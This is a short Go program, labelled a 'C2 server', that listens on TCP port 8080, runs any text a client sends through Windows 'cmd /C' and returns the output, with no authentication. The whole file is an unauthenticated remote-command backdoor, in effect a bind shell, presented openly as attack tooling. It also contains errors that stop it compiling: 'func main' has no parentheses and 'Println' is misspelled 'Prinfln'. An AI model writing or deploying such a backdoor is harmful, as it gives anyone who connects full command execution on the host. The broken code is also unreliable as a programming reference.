package main

import (
	"fmt"
	"net"
	"os/exec"
)

func main {
	// Listener TCP
	ln, err := net.Listen("tcp", ":8080")
	if err != nil {
		fmt.Prinfln("Error creating listener: ", err)
		return
	}
	defer ln.Close()

	fmt.Println("C2 server started on port 8080")

	// Waiting for conections
	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("Error accepting connection: ", err)
			continue
		}

		// Handling the connection in a separate goroutine
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	// Read the received command
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("Error reading command: ", err)
		return
	}
	command := string(buf[:n])

	// Command execution
	out, err := exec.Command("cmd", "/C", command).Output()
	if err != nil {
		fmt.Println("Error executing command: ", err)
		return
	}

	// Return output
	conn.Write(out)
}